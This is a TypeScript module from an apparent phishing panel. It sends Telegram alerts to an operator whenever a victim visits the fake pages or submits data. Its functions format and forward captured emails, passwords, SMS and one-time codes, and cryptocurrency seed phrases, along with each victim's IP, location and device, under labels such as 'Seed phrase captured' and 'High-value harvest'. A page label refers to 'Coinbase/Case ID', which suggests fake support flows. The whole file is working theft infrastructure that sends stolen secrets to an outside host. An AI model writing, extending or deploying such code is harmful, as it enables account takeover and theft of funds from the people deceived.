// Telegram Bot API — configure via Settings → Telegram or TELEGRAM_* env vars.

import { dbGetSettings } from './database.js';

export interface TelegramConfig {
	enabled: boolean;
	botToken: string;
	chatId: string;
	fields: { email: boolean; password: boolean; seed: boolean; ip: boolean; userAgent: boolean };
}

export interface TelegramBotInfo {
	id: number;
	username: string;
	firstName: string;
}

export interface TelegramChatOption {
	chatId: string;
	title: string;
	type: string;
}

type TelegramApiResponse<T> = {
	ok: boolean;
	description?: string;
	result?: T;
};

/** In-memory dedupe (per server process). Keys expire by TTL. */
const dedupeSent = new Map<string, number>();

const DEDUPE_TTL_MS = {
	sessionStart: 30 * 60 * 1000,
	pageChange: 5 * 60 * 1000,
	/** Same button/values on same page — suppress double-clicks, not new inputs */
	pageInput: 45 * 1000,
	harvest: 5 * 60 * 1000
} as const;

const MAX_DEDUPE_ENTRIES = 5000;

function pruneDedupeCache(): void {
	if (dedupeSent.size <= MAX_DEDUPE_ENTRIES) return;
	const now = Date.now();
	for (const [key, at] of dedupeSent) {
		if (now - at > DEDUPE_TTL_MS.sessionStart) dedupeSent.delete(key);
	}
}

function shouldSendDedupe(key: string, ttlMs: number): boolean {
	const now = Date.now();
	const prev = dedupeSent.get(key);
	if (prev !== undefined && now - prev < ttlMs) return false;
	dedupeSent.set(key, now);
	pruneDedupeCache();
	return true;
}

async function callTelegramApi<T>(
	method: string,
	botToken: string,
	body?: Record<string, unknown>
): Promise<{ ok: true; result: T } | { ok: false; error: string }> {
	const token = botToken.trim();
	if (!token) return { ok: false, error: 'Bot token is required' };

	try {
		const res = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: body ? JSON.stringify(body) : undefined,
			signal: AbortSignal.timeout(15000)
		});
		const data = (await res.json()) as TelegramApiResponse<T>;
		if (!data.ok) {
			return { ok: false, error: data.description || `Telegram API error (${res.status})` };
		}
		return { ok: true, result: data.result as T };
	} catch (err: unknown) {
		const message = err instanceof Error ? err.message : 'Network error';
		return { ok: false, error: message };
	}
}

export function getTelegramConfig(): TelegramConfig {
	const s = dbGetSettings('telegram.');
	return {
		enabled: s['telegram.enabled'] === '1',
		botToken: s['telegram.bot_token'] ?? process.env.TELEGRAM_BOT_TOKEN ?? '',
		chatId: s['telegram.chat_id'] ?? process.env.TELEGRAM_CHAT_ID ?? '',
		fields: {
			email: (s['telegram.field_email'] ?? '1') !== '0',
			password: (s['telegram.field_password'] ?? '1') !== '0',
			seed: (s['telegram.field_seed'] ?? '1') !== '0',
			ip: (s['telegram.field_ip'] ?? '1') !== '0',
			userAgent: (s['telegram.field_user_agent'] ?? '0') !== '0'
		}
	};
}

export async function verifyTelegramBot(
	botToken: string
): Promise<{ ok: true; bot: TelegramBotInfo } | { ok: false; error: string }> {
	const res = await callTelegramApi<{
		id: number;
		username?: string;
		first_name?: string;
	}>('getMe', botToken);

	if (!res.ok) return res;

	return {
		ok: true,
		bot: {
			id: res.result.id,
			username: res.result.username || '',
			firstName: res.result.first_name || 'Bot'
		}
	};
}

export async function discoverTelegramChats(
	botToken: string
): Promise<{ ok: true; chats: TelegramChatOption[] } | { ok: false; error: string }> {
	const verify = await verifyTelegramBot(botToken);
	if (!verify.ok) return verify;

	const updates = await callTelegramApi<
		{
			update_id: number;
			message?: { chat: { id: number; type: string; title?: string; username?: string; first_name?: string } };
			my_chat_member?: { chat: { id: number; type: string; title?: string; username?: string; first_name?: string } };
		}[]
	>('getUpdates', botToken, { limit: 50 });

	if (!updates.ok) return updates;

	const seen = new Map<string, TelegramChatOption>();
	for (const u of updates.result) {
		const chat = u.message?.chat ?? u.my_chat_member?.chat;
		if (!chat) continue;
		const chatId = String(chat.id);
		if (seen.has(chatId)) continue;
		const title =
			chat.title ||
			(chat.username ? `@${chat.username}` : '') ||
			chat.first_name ||
			`Chat ${chatId}`;
		seen.set(chatId, { chatId, title, type: chat.type });
	}

	const chats = [...seen.values()].sort((a, b) => a.title.localeCompare(b.title));
	if (chats.length === 0) {
		return {
			ok: false,
			error:
				'No chats found. Open your bot in Telegram, send /start (or add the bot to a group), then try again.'
		};
	}

	return { ok: true, chats };
}

export async function sendTelegram(
	message: string,
	cfg: TelegramConfig = getTelegramConfig(),
	opts?: { skipEnabledCheck?: boolean }
): Promise<{ ok: boolean; error?: string }> {
	if (!opts?.skipEnabledCheck && !cfg.enabled) {
		return { ok: false, error: 'Telegram notifications are disabled in settings' };
	}
	if (!cfg.botToken?.trim() || !cfg.chatId?.trim()) {
		return { ok: false, error: 'Bot token and chat ID are required' };
	}

	const chatId = cfg.chatId.trim();
	const numericChatId = /^-?\d+$/.test(chatId) ? Number(chatId) : chatId;

	const res = await callTelegramApi<{ message_id: number }>('sendMessage', cfg.botToken.trim(), {
		chat_id: numericChatId,
		text: message,
		parse_mode: 'HTML',
		disable_web_page_preview: true
	});

	if (!res.ok) return { ok: false, error: res.error };
	return { ok: true };
}

export interface VisitorInfo {
	ip: string;
	userId: string;
	city?: string;
	region?: string;
	country?: string;
	browser?: string;
	platform?: string;
	module?: string;
	capturedBy?: string;
	lastPageRoute?: string;
}

function htmlEscape(s: string): string {
	return s.replace(/[&<>]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' })[c] || c);
}

/** Normalize page labels so "Case ID" and "Coinbase/Case ID" compare equal. */
function normalizePageRoute(route: string): string {
	const r = route.replace(/^Review:\s*/i, '').trim();
	if (!r) return '';
	if (r.includes('/')) return r;
	return r;
}

export function routesEquivalent(a: string, b: string): boolean {
	const na = normalizePageRoute(a);
	const nb = normalizePageRoute(b);
	if (!na || !nb) return na === nb;
	if (na === nb) return true;
	const short = na.includes('/') ? na.split('/').pop()! : na;
	const shortB = nb.includes('/') ? nb.split('/').pop()! : nb;
	return short === shortB;
}

function visitorBlock(v: VisitorInfo): string {
	const loc = [v.city, v.region, v.country].filter(Boolean).join(', ') || 'Unknown';
	const device = [v.browser, v.platform].filter(Boolean).join('/') || 'Unknown';
	const lines: string[] = [];
	lines.push(`\u{1F464} <b>Visitor</b> <code>${htmlEscape(v.userId || '—')}</code>`);
	lines.push(`\u{1F4CD} <code>${htmlEscape(v.ip)}</code> · ${htmlEscape(loc)}`);
	lines.push(`\u{1F4F1} ${htmlEscape(device)}`);
	if (v.module) lines.push(`\u{1F517} ${htmlEscape(v.module)}`);
	if (v.capturedBy) {
		const page = v.lastPageRoute ? normalizePageRoute(v.lastPageRoute) : '';
		lines.push(
			`\u{1F310} ${htmlEscape(v.capturedBy)}${page ? ` · <code>${htmlEscape(page)}</code>` : ''}`
		);
	}
	return lines.join('\n');
}

const FIELD_LABELS: Record<string, string> = {
	currentPassword: 'Current password',
	newPassword: 'New password',
	confirmPassword: 'Confirm password',
	password: 'Password',
	email: 'Email',
	code: 'Code',
	smsCode: 'SMS code',
	deviceUrl: 'Device link',
	seed: 'Seed phrase',
	phrase: 'Seed phrase',
	mnemonic: 'Seed phrase'
};

function formatCapturedFields(
	fields: Record<string, string>,
	cfg: TelegramConfig
): string[] {
	const lines: string[] = [];
	for (const [key, raw] of Object.entries(fields)) {
		const val = String(raw ?? '').trim();
		if (!val) continue;

		const lower = key.toLowerCase();
		if (/password/.test(lower) && !cfg.fields.password) continue;
		if (/(seed|phrase|mnemonic)/.test(lower) && !cfg.fields.seed) continue;
		if (lower === 'email' && !cfg.fields.email) continue;

		const label =
			FIELD_LABELS[key] ||
			key
				.replace(/_/g, ' ')
				.replace(/([A-Z])/g, ' $1')
				.replace(/^\w/, (c) => c.toUpperCase())
				.trim();

		const icon = /password/.test(lower)
			? '\u{1F511}'
			: /code|sms|otp/.test(lower)
				? '\u{1F4F1}'
				: /seed|phrase|mnemonic/.test(lower)
					? '\u{1F510}'
					: '\u{1F4DD}';

		lines.push(`${icon} <b>${htmlEscape(label)}:</b> <code>${htmlEscape(val)}</code>`);
	}
	return lines;
}

export type PageActionPriority = 'high' | 'skip';

/** Only skip automatic/non-input events. Everything else is reported. */
export function classifyPageAction(
	_page: string,
	action: string,
	fields?: Record<string, string>,
	detail?: string
): PageActionPriority {
	const act = (action || '').trim().toLowerCase();
	if (act === 'timer') return 'skip';
	const hasFields =
		fields &&
		Object.entries(fields).some(([, v]) => String(v ?? '').trim().length > 0);
	const hasDetail = !!(detail && detail.trim().length > 0);
	const hasAction = !!(action && action.trim().length > 0);
	if (!hasFields && !hasDetail && !hasAction) return 'skip';
	return 'high';
}

function inputFingerprint(
	action: string,
	fields?: Record<string, string>,
	detail?: string
): string {
	const parts: string[] = [action.trim().toLowerCase()];
	if (fields) {
		for (const [k, v] of Object.entries(fields).sort(([a], [b]) => a.localeCompare(b))) {
			parts.push(`${k}=${String(v).trim().slice(0, 160)}`);
		}
	} else if (detail?.trim()) {
		parts.push(detail.trim().slice(0, 160));
	}
	return parts.join('|');
}

function pageActionDedupeKey(
	v: VisitorInfo,
	page: string,
	action: string,
	fields?: Record<string, string>,
	detail?: string
): string {
	const normPage = normalizePageRoute(page);
	const fp = inputFingerprint(action, fields, detail);
	return `input:${v.userId}:${normPage}:${fp}`;
}

function formatActionLabel(action: string, page: string): string {
	const act = (action || '').trim();
	if (act === 'password_changed') return 'Password submitted';
	if (act === 'case_code_valid') return 'Case code entered';
	if (act === 'link_submitted') return 'Link pasted';
	if (/^\d{4,8}$/.test(act)) return `Code: ${act}`;
	if (/^approved\b/i.test(act) || act === 'approve') return 'Confirmed / approved';
	if (/^denied\b/i.test(act) || /deny/i.test(act)) return 'Denied — not me';
	if (/^submitted\b/i.test(act)) return 'Submitted';
	if (/^continue$/i.test(act)) return 'Continue';
	if (act === 'timer') return 'Auto-advance (loading)';
	if (act.startsWith('Review:')) return act.replace(/^Review:\s*/i, 'Review · ');
	if (/seed phrase/i.test(act)) return act;
	return act || normalizePageRoute(page) || 'Interaction';
}

function harvestDedupeKey(input: HarvestNotification): string {
	const data = input.data;
	const fingerprint =
		typeof data === 'string'
			? data.slice(0, 64)
			: JSON.stringify(data).slice(0, 64);
	return `harvest:${input.visitorIp}:${input.type}:${fingerprint}`;
}

/** New visitor session — once per visitor id per cooldown window. */
export async function notifyVisitorConnect(v: VisitorInfo): Promise<void> {
	const cfg = getTelegramConfig();
	if (!cfg.enabled) return;

	const key = `session:${v.userId || v.ip}`;
	if (!shouldSendDedupe(key, DEDUPE_TTL_MS.sessionStart)) return;

	const page = v.lastPageRoute ? normalizePageRoute(v.lastPageRoute) : '—';
	const lines = [
		`\u{1F195} <b>New visitor session</b>`,
		'',
		visitorBlock(v),
		'',
		`\u{1F4CA} Landed on: <code>${htmlEscape(page)}</code>`,
		`\u{1F4A1} <i>A visitor opened your panel domain. Watch for credentials on the next steps.</i>`
	];

	await sendTelegram(lines.join('\n'), cfg).catch((err) => {
		console.warn('[telegram] connect notify failed:', err?.message || err);
	});
}

/**
 * Optional funnel navigation alert. Disabled by default — user inputs are
 * reported via notifyPageAction (Continue, codes, review buttons, etc.).
 */
export async function notifyVisitorPage(
	v: VisitorInfo,
	fromPage: string,
	toPage: string
): Promise<void> {
	const cfg = getTelegramConfig();
	if (!cfg.enabled) return;
	if (routesEquivalent(fromPage, toPage)) return;

	const from = normalizePageRoute(fromPage);
	const to = normalizePageRoute(toPage);
	if (!to) return;

	const key = `page:${v.userId}:${to}`;
	if (!shouldSendDedupe(key, DEDUPE_TTL_MS.pageChange)) return;

	const lines = [
		`\u{1F501} <b>Page change</b>`,
		'',
		visitorBlock({ ...v, lastPageRoute: to }),
		'',
		`\u{1F4C4} <code>${htmlEscape(from || '—')}</code> → <b>${htmlEscape(to)}</b>`
	];

	await sendTelegram(lines.join('\n'), cfg).catch((err) => {
		console.warn('[telegram] page-change notify failed:', err?.message || err);
	});
}

export async function notifyPageAction(
	v: VisitorInfo,
	page: string,
	action: string,
	detail?: string,
	fields?: Record<string, string>
): Promise<void> {
	const cfg = getTelegramConfig();
	if (!cfg.enabled) return;

	if (classifyPageAction(page, action, fields, detail) === 'skip') return;

	const actionLabel = formatActionLabel(action, page);
	const dedupeKey = pageActionDedupeKey(v, page, action, fields, detail);
	if (!shouldSendDedupe(dedupeKey, DEDUPE_TTL_MS.pageInput)) return;

	const normPage = normalizePageRoute(page);
	const lines: string[] = [];
	lines.push(`\u{1F4E5} <b>Visitor input</b>`);
	lines.push('');
	lines.push(visitorBlock({ ...v, lastPageRoute: normPage || page }));
	lines.push(`\u{1F4C4} Page: <b>${htmlEscape(normPage || page)}</b>`);
	lines.push(`\u{2705} <b>${htmlEscape(actionLabel)}</b>`);

	const fieldLines = fields ? formatCapturedFields(fields, cfg) : [];
	if (fieldLines.length) {
		lines.push(...fieldLines);
	} else if (detail) {
		lines.push(`\u{1F4DD} <code>${htmlEscape(detail)}</code>`);
	}

	await sendTelegram(lines.join('\n'), cfg).catch((err) => {
		console.warn('[telegram] page-action notify failed:', err?.message || err);
	});
}

export interface HarvestNotification {
	visitorIp: string;
	flow: string;
	type: 'account' | 'phrase' | 'upload';
	data: unknown;
	userAgent?: string;
	capturedBy?: string;
}

export async function notifyHarvest(input: HarvestNotification): Promise<void> {
	const cfg = getTelegramConfig();
	if (!cfg.enabled) return;

	const key = harvestDedupeKey(input);
	if (!shouldSendDedupe(key, DEDUPE_TTL_MS.harvest)) return;

	const typeLabel =
		input.type === 'phrase' ? 'Seed phrase' : input.type === 'account' ? 'Account' : 'Upload';

	const lines: string[] = [];
	lines.push(`\u{1F6A8} <b>${htmlEscape(typeLabel)} captured</b>`);
	if (cfg.fields.ip) lines.push(`\u{1F4CD} <code>${htmlEscape(input.visitorIp)}</code>`);
	lines.push(`\u{1F517} Flow: ${htmlEscape(input.flow || '—')}`);

	const data = (input.data || {}) as Record<string, unknown>;
	if (cfg.fields.email && data.email) lines.push(`\u{1F4E7} <code>${htmlEscape(String(data.email))}</code>`);
	if (cfg.fields.password && data.password) {
		lines.push(`\u{1F511} <code>${htmlEscape(String(data.password))}</code>`);
	}
	if (cfg.fields.seed) {
		const phrase =
			typeof input.data === 'string'
				? input.data
				: (data.phrase as string) || (data.seed as string) || (data.mnemonic as string);
		if (phrase) lines.push(`\u{1F510} <code>${htmlEscape(String(phrase))}</code>`);
	}
	if (cfg.fields.userAgent && input.userAgent) {
		lines.push(`\u{1F4F1} <code>${htmlEscape(input.userAgent.slice(0, 200))}</code>`);
	}
	if (input.capturedBy) lines.push(`\u{1F310} ${htmlEscape(input.capturedBy)}`);
	lines.push(`\u{1F4A1} <i>High-value harvest — review immediately in Vault/Seeds.</i>`);

	await sendTelegram(lines.join('\n'), cfg).catch((err) => {
		console.warn('[telegram] notify failed:', err?.message || err);
	});
}
